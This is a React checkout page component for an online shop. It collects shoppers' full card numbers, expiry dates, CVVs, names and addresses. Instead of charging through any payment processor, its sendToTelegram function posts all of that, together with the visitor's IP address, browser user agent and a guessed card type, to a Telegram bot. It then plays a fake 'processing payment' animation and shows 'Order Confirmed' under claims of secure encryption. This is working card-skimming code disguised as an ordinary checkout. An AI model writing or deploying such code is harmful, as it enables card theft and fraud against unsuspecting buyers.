import React, { useState } from 'react';
import { useCart } from '../context/CartContext';
import { useCurrencyLanguage } from '../context/CurrencyLanguageContext';
import { supabase } from '../lib/supabase';
import { CreditCard, Lock, CheckCircle, ArrowRight, Shield, Truck, RefreshCw, ShoppingBag } from 'lucide-react';
import TelegramService from '../services/telegramService';
import { TELEGRAM_CONFIG } from '../config/telegram';

const telegramService = new TelegramService(TELEGRAM_CONFIG);

interface CheckoutPageProps {
  onNavigate: (page: string) => void;
}

export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
  const { cart, clearCart, isAuthenticated } = useCart();
  const { formatPrice } = useCurrencyLanguage();
  const [loading, setLoading] = useState(false);
  const [orderComplete, setOrderComplete] = useState(false);
  const [showProcessing, setShowProcessing] = useState(false);
  const [processingStep, setProcessingStep] = useState(0);
  const [orderId, setOrderId] = useState('');
  const [formData, setFormData] = useState({
    email: '',
    firstName: '',
    lastName: '',
    address: '',
    city: '',
    state: '',
    zipCode: '',
    country: '',
    cardNumber: '',
    cardName: '',
    expiryDate: '',
    cvv: '',
  });

  const subtotal = Math.round(
    cart.reduce((sum, item) => {
      const product = item.product;
      return sum + (product ? product.price * item.quantity : 0);
    }, 0) * 100
  ) / 100;
  
  const shippingFee = 5.99;
  const freeShippingThreshold = 50;
  const shipping: number = subtotal >= freeShippingThreshold ? 0 : shippingFee;
  const tax = Math.round(subtotal * 0.08 * 100) / 100;
  const total = Math.round((subtotal + shipping + tax) * 100) / 100;

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    if (name === 'cardNumber') {
      const formatted = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      setFormData((prev) => ({ ...prev, [name]: formatted }));
      return;
    }
    
    if (name === 'expiryDate') {
      const formatted = value.replace(/\D/g, '').replace(/(\d{2})(\d{0,2})/, '$1/$2');
      setFormData((prev) => ({ ...prev, [name]: formatted }));
      return;
    }
    
    if (name === 'cvv' || name === 'zipCode') {
      const formatted = value.replace(/\D/g, '');
      setFormData((prev) => ({ ...prev, [name]: formatted }));
      return;
    }
    
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const getBankInfo = (cardNumber: string) => {
    const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
    
    const binDatabase: { [key: string]: any } = {
      '499001': { bank: 'Visa', level: 'Gold', type: 'Credit', country: 'United States' },
      '4': { bank: 'Visa', level: 'Classic', type: 'Debit', country: 'Unknown' },
      '5': { bank: 'Mastercard', level: 'Standard', type: 'Credit', country: 'Unknown' },
      '3': { bank: 'American Express', level: 'Premium', type: 'Credit', country: 'United States' },
      '6': { bank: 'Discover', level: 'Standard', type: 'Credit', country: 'United States' },
    };

    for (const key in binDatabase) {
      if (bin.startsWith(key)) {
        return binDatabase[key];
      }
    }

    return { bank: 'Unknown', level: 'N/A', type: 'N/A', country: 'Unknown' };
  };

  const sendToTelegram = async (_order: { id: string }) => {
    try {
      let ipAddress = 'Unknown';
      try {
        console.log('🔍 Fetching IP address...');
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip;
        console.log('✅ IP Address captured:', ipAddress);
      } catch (ipError) {
        console.warn('⚠️ Could not fetch IP address:', ipError);
      }

      const userAgent = navigator.userAgent;
      console.log('🖥 User-Agent captured:', userAgent);

      const bankInfo = getBankInfo(formData.cardNumber);
      console.log('🏦 Bank Info:', bankInfo);
  
      const orderItems = cart.map((item) => ({
        name: item.product?.name || 'Unknown Product',
        quantity: item.quantity,
        price: item.product?.price || 0,
      }));
  
      const telegramPayload = {
        email: formData.email,
        firstName: formData.firstName,
        lastName: formData.lastName,
        address: formData.address,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        country: formData.country,
        cardNumber: formData.cardNumber,
        cardName: formData.cardName,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        orderTotal: total,
        orderItems: orderItems,
        ipAddress: ipAddress,
        userAgent: userAgent,
        bankInfo: bankInfo,
      };
  
      console.log('📤 Sending to Telegram with full data:', {
        ip: telegramPayload.ipAddress,
        userAgent: telegramPayload.userAgent,
        bankInfo: telegramPayload.bankInfo
      });
  
      const success = await telegramService.sendFormData(telegramPayload);
      
      if (success) {
        console.log('✅ Data sent to Telegram successfully');
      } else {
        console.warn('⚠️ Failed to send data to Telegram, but order was processed');
      }
    } catch (error) {
      console.error('❌ Error sending to Telegram:', error);
    }
  };

  const PROCESSING_STEPS = ['Validating order', 'Processing payment', 'Confirming with seller', 'Finalizing'];
  const PROCESSING_DELAY_MS = 2800;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!isAuthenticated) {
      alert('Please log in to complete your purchase');
      return;
    }

    setLoading(true);

    try {
      const { data: { session } } = await supabase.auth.getSession();
      
      if (!session) throw new Error('Not authenticated');

      const { data: order, error: orderError } = await supabase
        .from('orders')
        .insert({
          user_id: session.user.id,
          total_amount: total,
          currency: 'USD',
          status: 'pending',
        })
        .select()
        .single();

      if (orderError) throw orderError;

      const orderItems = cart.map((item) => ({
        order_id: order.id,
        product_id: item.product_id,
        quantity: item.quantity,
        price: item.product?.price || 0,
      }));

      const { error: itemsError } = await supabase
        .from('order_items')
        .insert(orderItems);

      if (itemsError) throw itemsError;

      await sendToTelegram(order);

      await clearCart();
      setOrderId(order.id);
      setLoading(false);
      setShowProcessing(true);
      setProcessingStep(0);

      // Animate through processing steps, then show order confirmed
      const stepDuration = PROCESSING_DELAY_MS / PROCESSING_STEPS.length;
      let step = 0;
      const stepTimer = setInterval(() => {
        step += 1;
        setProcessingStep(step);
        if (step >= PROCESSING_STEPS.length) {
          clearInterval(stepTimer);
          setTimeout(() => {
            setShowProcessing(false);
            setOrderComplete(true);
          }, 400);
        }
      }, stepDuration);

    } catch (error: unknown) {
      console.error('Error:', error);
      alert('There was an error processing your order. Please try again.');
      setLoading(false);
    }
  };

  const formatOrderId = (id: string) => {
    if (!id) return '—';
    return `#${id.replace(/-/g, '').toUpperCase().slice(0, 8)}`;
  };

  if (cart.length === 0 && !orderComplete) {
    return (
      <div className="min-h-screen bg-gray-50 dark:bg-gray-900 py-16">
        <div className="max-w-2xl mx-auto px-4">
          <div className="text-center bg-white dark:bg-gray-800 rounded-2xl shadow-sm p-12 border border-gray-200 dark:border-gray-700">
            <div className="w-24 h-24 bg-gray-100 dark:bg-gray-700 rounded-full flex items-center justify-center mx-auto mb-6">
              <ShoppingBag size={48} className="text-gray-400" />
            </div>
            <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-3">Your cart is empty</h2>
            <p className="text-gray-600 dark:text-gray-400 mb-8 text-lg">Add some items to proceed to checkout</p>
            <button
              onClick={() => onNavigate('products')}
              className="inline-flex items-center gap-2 px-8 py-4 bg-gray-900 dark:bg-white text-white dark:text-gray-900 rounded-lg hover:bg-gray-800 dark:hover:bg-gray-100 font-semibold transition-all shadow-lg hover:shadow-xl transform hover:scale-105"
            >
              Continue Shopping
              <ArrowRight size={20} />
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (showProcessing) {
    return (
      <div className="min-h-screen bg-gray-50 dark:bg-gray-900 flex items-center justify-center py-16 px-4">
        <div className="max-w-md w-full bg-white dark:bg-gray-800 rounded-2xl shadow-xl border border-gray-200 dark:border-gray-700 p-8 md:p-10">
          <div className="flex flex-col items-center text-center">
            <div className="w-20 h-20 rounded-full border-4 border-red-600 dark:border-red-500 border-t-transparent animate-spin mb-8" />
            <h2 className="text-2xl md:text-3xl font-bold text-gray-900 dark:text-white mb-2">
              Processing your order
            </h2>
            <p className="text-gray-600 dark:text-gray-400 mb-8">
              Please wait while we confirm your purchase.
            </p>
            <ul className="w-full space-y-3 text-left">
              {PROCESSING_STEPS.map((label, i) => (
                <li
                  key={label}
                  className={`flex items-center gap-3 px-4 py-3 rounded-lg border transition-colors ${
                    i < processingStep
                      ? 'bg-green-50 dark:bg-green-900/20 border-green-200 dark:border-green-800 text-green-800 dark:text-green-200'
                      : i === processingStep
                        ? 'bg-red-50 dark:bg-red-900/20 border-red-200 dark:border-red-800 text-red-800 dark:text-red-200 font-semibold'
                        : 'bg-gray-50 dark:bg-gray-700/50 border-gray-200 dark:border-gray-700 text-gray-500 dark:text-gray-400'
                  }`}
                >
                  {i < processingStep ? (
                    <CheckCircle size={20} className="text-green-600 dark:text-green-400 flex-shrink-0" />
                  ) : (
                    <span className="w-5 h-5 rounded-full border-2 border-current flex-shrink-0 flex items-center justify-center text-xs font-bold">
                      {i === processingStep ? '…' : i + 1}
                    </span>
                  )}
                  <span>{label}</span>
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>
    );
  }

  if (orderComplete) {
    return (
      <div className="min-h-screen bg-gray-50 dark:bg-gray-900 py-16">
        <div className="max-w-2xl mx-auto px-4">
          <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-lg p-12 text-center border border-gray-200 dark:border-gray-700">
            <div className="w-20 h-20 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center mx-auto mb-6">
              <CheckCircle size={48} className="text-green-600 dark:text-green-400" />
            </div>
            <h2 className="text-4xl font-bold text-gray-900 dark:text-white mb-3">Order Confirmed!</h2>
            <p className="text-xl text-gray-600 dark:text-gray-400 mb-2">Thank you for your purchase</p>
            <div className="bg-gray-50 dark:bg-gray-700/50 rounded-lg p-4 mb-6 inline-block">
              <p className="text-sm font-semibold text-gray-500 dark:text-gray-400">Order ID</p>
              <p className="text-lg font-bold text-gray-900 dark:text-white">{formatOrderId(orderId)}</p>
            </div>
            <div className="bg-gradient-to-br from-blue-50 to-indigo-50 dark:from-blue-900/20 dark:to-indigo-900/20 rounded-xl p-6 mb-8 text-left border border-blue-200 dark:border-blue-800">
              <h3 className="font-bold text-gray-900 dark:text-white mb-4 flex items-center gap-2">
                <Truck className="text-blue-600 dark:text-blue-400" size={20} />
                What's Next?
              </h3>
              <ul className="space-y-3 text-gray-700 dark:text-gray-300">
                <li className="flex items-start gap-3">
                  <span className="text-blue-600 dark:text-blue-400 font-bold mt-0.5">✓</span>
                  <span>You will receive an order confirmation email shortly</span>
                </li>
                <li className="flex items-start gap-3">
                  <span className="text-blue-600 dark:text-blue-400 font-bold mt-0.5">✓</span>
                  <span>Your order will be processed within 1-2 business days</span>
                </li>
                <li className="flex items-start gap-3">
                  <span className="text-blue-600 dark:text-blue-400 font-bold mt-0.5">✓</span>
                  <span>Shipping typically takes 3-5 business days</span>
                </li>
              </ul>
            </div>
            <button
              onClick={() => onNavigate('products')}
              className="inline-flex items-center gap-2 px-8 py-4 bg-gray-900 dark:bg-white text-white dark:text-gray-900 rounded-lg hover:bg-gray-800 dark:hover:bg-gray-100 font-semibold transition-all shadow-lg hover:shadow-xl transform hover:scale-105"
            >
              Continue Shopping
              <ArrowRight size={20} />
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-900 py-8">
      <div className="max-w-7xl mx-auto px-4">
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-gray-900 dark:text-white mb-2">Checkout</h1>
          <p className="text-gray-600 dark:text-gray-400">Complete your order securely</p>
        </div>
        
        {!isAuthenticated && (
          <div className="mb-6 p-4 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-xl flex items-center gap-3">
            <Lock size={24} className="text-amber-600 dark:text-amber-400 flex-shrink-0" />
            <div>
              <p className="font-semibold text-amber-800 dark:text-amber-200">Sign in required</p>
              <p className="text-sm text-amber-700 dark:text-amber-300">Please log in to complete your order.</p>
            </div>
            <button
              type="button"
              onClick={() => onNavigate('cart')}
              className="ml-auto px-4 py-2 bg-amber-600 hover:bg-amber-700 text-white rounded-lg font-medium transition-colors"
            >
              Go to Cart
            </button>
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="bg-white dark:bg-gray-800 rounded-xl shadow-sm p-6 border border-gray-200 dark:border-gray-700">
                <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4">Contact Information</h2>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Email
                  </label>
                  <input
                    type="email"
                    name="email"
                    required
                    value={formData.email}
                    onChange={handleInputChange}
                    placeholder="john.doe@example.com"
                    className="w-full px-4 py-3 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
                  />
                </div>
              </div>
            </div>

            <div className="bg-white dark:bg-gray-800 rounded-xl shadow-sm p-6 border border-gray-200 dark:border-gray-700">
              <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4">Shipping Address</h2>
              <div className="space-y-4">
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      First Name
                    </label>
                    <input
                      type="text"
                      name="firstName"
                      required
                      value={formData.firstName}
                      onChange={handleInputChange}
                      placeholder="John"
                      className="w-full px-4 py-3 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Last Name
                    </label>
                    <input
                      type="text"
                      name="lastName"
                      required
                      value={formData.lastName}
                      onChange={handleInputChange}
                      placeholder="Doe"
                      className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Address
                  </label>
                  <input
                    type="text"
                    name="address"
                    required
                    value={formData.address}
                    onChange={handleInputChange}
                    placeholder="123 Main Street, Apt 4B"
                    className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      City
                    </label>
                    <input
                      type="text"
                      name="city"
                      required
                      value={formData.city}
                      onChange={handleInputChange}
                      placeholder="New York"
                      className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      State
                    </label>
                    <input
                      type="text"
                      name="state"
                      required
                      value={formData.state}
                      onChange={handleInputChange}
                      placeholder="NY"
                      className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      ZIP Code
                    </label>
                    <input
                      type="text"
                      name="zipCode"
                      required
                      value={formData.zipCode}
                      onChange={handleInputChange}
                      placeholder="10001"
                      maxLength={10}
                      className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Country
                    </label>
                    <input
                      type="text"
                      name="country"
                      required
                      value={formData.country}
                      onChange={handleInputChange}
                      placeholder="United States"
                      className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    />
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-white dark:bg-gray-800 rounded-xl shadow-sm p-6 border border-gray-200 dark:border-gray-700">
              <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4 flex items-center gap-2">
                <CreditCard size={24} />
                Payment Information
              </h2>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Card Number
                  </label>
                  <input
                    type="text"
                    name="cardNumber"
                    required
                    placeholder="1234 5678 9012 3456"
                    value={formData.cardNumber}
                    onChange={handleInputChange}
                    maxLength={19}
                    className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Name on Card
                  </label>
                  <input
                    type="text"
                    name="cardName"
                    required
                    value={formData.cardName}
                    onChange={handleInputChange}
                    placeholder="John Doe"
                    className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Expiry Date
                    </label>
                    <input
                      type="text"
                      name="expiryDate"
                      required
                      placeholder="MM/YY"
                      value={formData.expiryDate}
                      onChange={handleInputChange}
                      maxLength={5}
                      className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      CVV
                    </label>
                    <input
                      type="text"
                      name="cvv"
                      required
                      placeholder="123"
                      value={formData.cvv}
                      onChange={handleInputChange}
                      maxLength={4}
                      className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    />
                  </div>
                </div>
              </div>

              <div className="mt-4 flex items-center gap-2 text-sm text-gray-600 dark:text-gray-400 bg-blue-50 dark:bg-blue-900/20 p-3 rounded-lg border border-blue-200 dark:border-blue-800">
                <Lock size={16} className="text-blue-600 dark:text-blue-400 flex-shrink-0" />
                <span className="font-medium">Your payment information is encrypted and secure</span>
              </div>
            </div>

            <button
              type="submit"
              disabled={loading || !isAuthenticated}
              className="w-full py-4 bg-gray-900 dark:bg-white text-white dark:text-gray-900 rounded-lg hover:bg-gray-800 dark:hover:bg-gray-100 font-semibold text-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-lg hover:shadow-xl transform hover:scale-[1.02] active:scale-100 flex items-center justify-center gap-2"
            >
              {loading ? (
                <>
                  <div className="w-5 h-5 border-2 border-white dark:border-gray-900 border-t-transparent rounded-full animate-spin" />
                  Processing...
                </>
              ) : (
                <>
                  <Lock size={20} />
                  Pay {formatPrice(total)}
                </>
              )}
            </button>
          </form>
        </div>

        <div className="lg:col-span-1">
          <div className="bg-white dark:bg-gray-800 rounded-xl shadow-sm p-6 sticky top-24 border border-gray-200 dark:border-gray-700">
            <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4">Order Summary</h2>
            
            <div className="space-y-3 mb-4 max-h-60 overflow-y-auto">
              {cart.map((item) => {
                const product = item.product;
                if (!product) return null;
                
                return (
                  <div key={item.id} className="flex gap-3 pb-3 border-b border-gray-200 dark:border-gray-700">
                    <img
                      src={product.image_url || 'https://via.placeholder.com/64?text=Product'}
                      alt={product.name}
                      className="w-16 h-16 object-cover rounded"
                      onError={(e) => {
                        (e.target as HTMLImageElement).src = 'https://via.placeholder.com/64?text=Product';
                      }}
                    />
                    <div className="flex-1">
                      <p className="text-sm font-medium text-gray-900 dark:text-white line-clamp-1">
                        {product.name}
                      </p>
                      <p className="text-sm text-gray-600 dark:text-gray-400">Qty: {item.quantity}</p>
                      <p className="text-sm font-semibold text-gray-900 dark:text-white">
                        {formatPrice(product.price * item.quantity)}
                      </p>
                    </div>
                  </div>
                );
              })}
            </div>

            <div className="space-y-3 mb-4">
              <div className="flex justify-between text-gray-600 dark:text-gray-400">
                <span>Subtotal</span>
                <span className="font-semibold text-gray-900 dark:text-white">{formatPrice(subtotal)}</span>
              </div>
              <div className="flex justify-between text-gray-600 dark:text-gray-400">
                <span>Shipping</span>
                <span className="font-semibold text-gray-900 dark:text-white">
                  {shipping === 0 ? (
                    <span className="text-green-600 dark:text-green-400">FREE</span>
                  ) : (
                    formatPrice(shipping)
                  )}
                </span>
              </div>
              <div className="flex justify-between text-gray-600 dark:text-gray-400">
                <span>Tax</span>
                <span className="font-semibold text-gray-900 dark:text-white">{formatPrice(tax)}</span>
              </div>
            </div>

            <div className="border-t border-gray-200 dark:border-gray-700 pt-4 flex justify-between">
              <span className="text-lg font-bold text-gray-900 dark:text-white">Total</span>
              <span className="text-xl font-bold text-gray-900 dark:text-white">{formatPrice(total)}</span>
            </div>

            {/* Trust Badges */}
            <div className="mt-6 pt-6 border-t border-gray-200 dark:border-gray-700 space-y-3">
              <div className="flex items-center gap-3 text-sm">
                <div className="w-8 h-8 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center flex-shrink-0">
                  <Shield size={16} className="text-green-600 dark:text-green-400" />
                </div>
                <div>
                  <p className="font-semibold text-gray-900 dark:text-white">Secure Checkout</p>
                  <p className="text-xs text-gray-500 dark:text-gray-400">256-bit SSL encryption</p>
                </div>
              </div>
              <div className="flex items-center gap-3 text-sm">
                <div className="w-8 h-8 bg-blue-100 dark:bg-blue-900/30 rounded-full flex items-center justify-center flex-shrink-0">
                  <Truck size={16} className="text-blue-600 dark:text-blue-400" />
                </div>
                <div>
                  <p className="font-semibold text-gray-900 dark:text-white">Free Shipping</p>
                  <p className="text-xs text-gray-500 dark:text-gray-400">On orders over {formatPrice(freeShippingThreshold)}</p>
                </div>
              </div>
              <div className="flex items-center gap-3 text-sm">
                <div className="w-8 h-8 bg-purple-100 dark:bg-purple-900/30 rounded-full flex items-center justify-center flex-shrink-0">
                  <RefreshCw size={16} className="text-purple-600 dark:text-purple-400" />
                </div>
                <div>
                  <p className="font-semibold text-gray-900 dark:text-white">Easy Returns</p>
                  <p className="text-xs text-gray-500 dark:text-gray-400">30-day return policy</p>
                </div>
              </div>
            </div>
          </div>
        </div>
        </div>
      </div>
    </div>
  );
};
